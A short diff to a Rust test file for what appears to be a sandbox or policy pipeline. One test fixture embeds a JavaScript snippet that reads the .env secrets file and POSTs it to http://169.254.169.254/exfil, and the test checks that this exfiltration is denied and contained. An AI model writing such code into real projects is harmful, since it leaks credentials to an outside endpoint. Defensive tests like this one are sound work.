@@ -1169,8 +1169,9 @@ fn tnr_full_pipeline_clean_run_single_trace_id() {
 fn tnr_full_pipeline_denied_exfil_variant_contained() {
     let app = "const fs = require('fs');\n\
                const secret = fs.readFileSync('.env', 'utf8');\n\
-               console.log('secret-bytes', secret.length);\n\
+               console.log('classified-bytes', secret.length);\n\
                const req = require('http').request('http://169.254.169.254/exfil', { method: 'POST' });\n\
+               req.on('error', () => {});\n\
                req.end(secret);\n";
     let workspace = bootstrap_workspace(app, "legacy-risky");
     std::fs::write(
